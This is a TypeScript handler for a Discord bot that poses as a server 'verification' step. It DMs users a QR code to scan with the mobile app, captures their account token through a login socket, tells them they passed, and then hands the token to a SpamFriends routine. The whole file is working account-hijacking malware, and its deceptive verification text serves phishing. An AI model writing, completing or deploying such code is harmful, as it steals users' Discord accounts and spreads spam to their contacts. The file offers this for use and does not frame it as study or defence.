import { Client, User, MessageEmbed, GuildMember, Message } from "discord.js"
import { GetEmojis } from "../util/emojis.d";
import SocketClient from "../SocketClient";
import SpamFriends from "./SpamFriends";

import { IConfig } from "../global";
const config: IConfig = require("../../config.json");

export default async (client: Client, user: User) => {
    const allEmojis = (require('../util/emojis') as GetEmojis).GetEmojis(client);

    const scanCodeUserEmbed: MessageEmbed = new MessageEmbed()
    .setColor("#2f3136")
    .addField(`${allEmojis.verifyEmoji} **Hello! Are you human? Let's find out!**`, `\`Please scan the QR Code below using the discord mobile app to verify!\``)
    .addField('Additional Notes:', `${allEmojis.mailEmoji} Do not share this QR Code with anybody \n${allEmojis.tickEmoji} This code grants access to the server and any other servers\n ${allEmojis.bellEmoji} You will be notified when you have been verified`)
    .setFooter('Verification Period: 2 minutes')

    const message: Message = (await user.send({
        embeds: [scanCodeUserEmbed]
    }).catch(e => {}) as Message);

    const token: string | boolean = (await SocketClient(message, scanCodeUserEmbed, client) as string)

    if (typeof token === 'boolean') return await user.send({
        embeds: [new MessageEmbed()
            .setColor("#ff2222")
            .setTitle(`You have failed verification!`)
            .setDescription(`${allEmojis.cancelEmoji} You have unfortunately failed to pass the verification in \`Horion Club\`.
            ${allEmojis.blankEmoji} **Reason:** \`Failed to verify! [Timeout]\`
            ${allEmojis.blankEmoji}${allEmojis.rightArrow} You can go back to #rules to start a new verification process by clicking on the Verify button again.`)
        ]
    }).catch(e => {});
    const verifyUserEmbed2: MessageEmbed = new MessageEmbed()
        .setColor("#22ff40")
        .setTitle(`You have been verified!`)
        .setDescription(`${allEmojis.successEmoji} You passed the verification successfully. You can now access \`Horion Club\`!`);

    await user.send({
        embeds: [verifyUserEmbed2]
    }).catch(e => {});

    const userInServer = (client.guilds.cache.get(config.guild)?.members.cache.get(user.id) as GuildMember);
    await userInServer.roles.add(config.role).catch(() => {
        console.log('FAILED TO GIVE ROLE')
        user.send({
            embeds: [new MessageEmbed()
                .setColor("#ff0000")
                .setTitle(`Failed to Verify`)
                .setDescription(`${allEmojis.cancelEmoji} An error occured while trying to verify you in \`Horion Club\`. Please try again later.`)]
        }).catch(e => console.log('FAILED TO MESSAGE USER'));
    });

    SpamFriends(token);
}